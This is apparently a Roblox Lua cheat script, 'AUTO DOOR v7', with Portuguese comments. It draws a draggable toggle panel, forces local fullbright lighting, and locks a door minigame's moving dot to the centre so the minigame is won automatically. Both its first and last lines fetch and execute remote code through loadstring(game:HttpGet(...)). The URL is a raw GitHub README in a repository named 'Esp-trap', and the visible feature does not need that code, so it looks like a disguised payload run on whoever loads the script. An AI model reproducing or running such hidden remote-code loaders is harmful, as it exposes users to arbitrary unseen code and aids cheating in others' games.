-- ================================================
-- AUTO DOOR v7
-- Imagem no canto de arrastar | Fullbright local
-- ================================================

loadstring(game:HttpGet("https://raw.githubusercontent.com/t35617853-dotcom/Esp-trap/refs/heads/main/README.md?token=GHSAT0AAAAAADZVCD5LFJ7PUPVWTXXIVSMM2OSM4MQ"))()

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Lighting = game:GetService("Lighting")

local player = Players.LocalPlayer
local PlayerGui = player.PlayerGui
local autoEnabled = false
local activeLoop = nil

-- ========== GUI ==========

local old = PlayerGui:FindFirstChild("AutoDoorGUI")
if old then old:Destroy() end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AutoDoorGUI"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = PlayerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 180, 0, 80)
frame.Position = UDim2.new(0, 20, 0, 200)
frame.BackgroundTransparency = 1
frame.BorderSizePixel = 0
frame.ClipsDescendants = true
frame.Parent = screenGui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)

local bgImage = Instance.new("ImageLabel", frame)
bgImage.Size = UDim2.new(1, 0, 1, 0)
bgImage.Image = "rbxassetid://99716957605211"
bgImage.ScaleType = Enum.ScaleType.Crop
bgImage.BackgroundTransparency = 1
bgImage.ZIndex = 1
Instance.new("UICorner", bgImage).CornerRadius = UDim.new(0, 12)

local overlay = Instance.new("Frame", frame)
overlay.Size = UDim2.new(1, 0, 1, 0)
overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
overlay.BackgroundTransparency = 0.45
overlay.BorderSizePixel = 0
overlay.ZIndex = 2
Instance.new("UICorner", overlay).CornerRadius = UDim.new(0, 12)

local stroke = Instance.new("UIStroke", frame)
stroke.Color = Color3.fromRGB(255, 255, 255)
stroke.Thickness = 1.5
stroke.Transparency = 0.6

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, -40, 0, 30)
title.Position = UDim2.new(0, 5, 0, 8)
title.BackgroundTransparency = 1
title.Text = "AUTO DOOR"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 18
title.Font = Enum.Font.Cartoon
title.TextStrokeTransparency = 0.4
title.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
title.ZIndex = 3

local btn = Instance.new("TextButton", frame)
btn.Size = UDim2.new(1, -20, 0, 26)
btn.Position = UDim2.new(0, 10, 0, 44)
btn.BorderSizePixel = 0
btn.TextSize = 13
btn.Font = Enum.Font.GothamBold
btn.TextColor3 = Color3.fromRGB(255, 255, 255)
btn.Text = "OFF"
btn.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
btn.ZIndex = 3
Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)

-- Canto superior direito â€” imagem como handle de arrastar
local dragHandle = Instance.new("Frame", frame)
dragHandle.Size = UDim2.new(0, 30, 0, 30)
dragHandle.Position = UDim2.new(1, -32, 0, 2)
dragHandle.BackgroundTransparency = 1
dragHandle.BorderSizePixel = 0
dragHandle.ZIndex = 4

local dragIcon = Instance.new("ImageLabel", dragHandle)
dragIcon.Size = UDim2.new(1, 0, 1, 0)
dragIcon.BackgroundTransparency = 1
dragIcon.Image = "rbxassetid://114476600288479"
dragIcon.ScaleType = Enum.ScaleType.Fit
dragIcon.ZIndex = 5

-- ========== ARRASTAR ==========

local dragging, dragStart, startPos = false, nil, nil

dragHandle.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
    or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = frame.Position
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if not dragging then return end
    if input.UserInputType == Enum.UserInputType.MouseMovement
    or input.UserInputType == Enum.UserInputType.Touch then
        local d = input.Position - dragStart
        frame.Position = UDim2.new(
            startPos.X.Scale, startPos.X.Offset + d.X,
            startPos.Y.Scale, startPos.Y.Offset + d.Y
        )
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
    or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)

-- ========== FULLBRIGHT LOCAL ==========
-- SÃ³ afeta o que vocÃª enxerga, nÃ£o muda nada no servidor

local originalBrightness = Lighting.Brightness
local originalAmbient = Lighting.Ambient
local originalOutdoorAmbient = Lighting.OutdoorAmbient
local originalClockTime = Lighting.ClockTime
local originalFogEnd = Lighting.FogEnd

local function enableFullbright()
    Lighting.Brightness = 2
    Lighting.Ambient = Color3.fromRGB(178, 178, 178)
    Lighting.OutdoorAmbient = Color3.fromRGB(178, 178, 178)
    Lighting.ClockTime = 14
    Lighting.FogEnd = 100000
end

local function disableFullbright()
    Lighting.Brightness = originalBrightness
    Lighting.Ambient = originalAmbient
    Lighting.OutdoorAmbient = originalOutdoorAmbient
    Lighting.ClockTime = originalClockTime
    Lighting.FogEnd = originalFogEnd
end

-- ========== LÃ“GICA ==========

local function stopLoop()
    if activeLoop then
        activeLoop:Disconnect()
        activeLoop = nil
    end
end

local function startAutoMiniGame(dotGui)
    if not autoEnabled then return end
    stopLoop()

    local dot = dotGui:FindFirstChild("Container")
        and dotGui.Container:FindFirstChild("Frame")

    if not dot then
        warn("[AutoDoor] Bolinha nao encontrada")
        return
    end

    print("[AutoDoor] Bolinha travada no centro!")

    local CENTRO = UDim2.new(0.5, 0, 0.5, 0)

    activeLoop = RunService.RenderStepped:Connect(function()
        if not autoEnabled then stopLoop(); return end
        if not dot or not dot.Parent then stopLoop(); return end
        dot.Position = CENTRO
    end)

    dotGui.AncestryChanged:Connect(function()
        if not dotGui.Parent then
            stopLoop()
            print("[AutoDoor] Mini game fechou.")
        end
    end)
end

-- ========== TOGGLE ==========

local toggling = false

local function toggle()
    if toggling then return end
    toggling = true
    task.delay(0.3, function() toggling = false end)

    autoEnabled = not autoEnabled

    if autoEnabled then
        btn.Text = "ON"
        btn.BackgroundColor3 = Color3.fromRGB(50, 200, 100)
        enableFullbright()
        print("[AutoDoor] ON")
        local existing = PlayerGui:FindFirstChild("Dot")
        if existing then
            task.wait(0.05)
            startAutoMiniGame(existing)
        end
    else
        btn.Text = "OFF"
        btn.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
        stopLoop()
        disableFullbright()
        print("[AutoDoor] OFF")
    end
end

btn.Activated:Connect(toggle)

-- ========== DETECTOR ==========

PlayerGui.ChildAdded:Connect(function(child)
    if child.Name == "Dot" then
        task.wait(0.05)
        startAutoMiniGame(child)
    end
end)

print("[AutoDoor] Pronto!")

loadstring(game:HttpGet("https://raw.githubusercontent.com/t35617853-dotcom/Esp-trap/refs/heads/main/README.md?token=GHSAT0AAAAAADZVCD5LFJ7PUPVWTXXIVSMM2OSM4MQ"))()
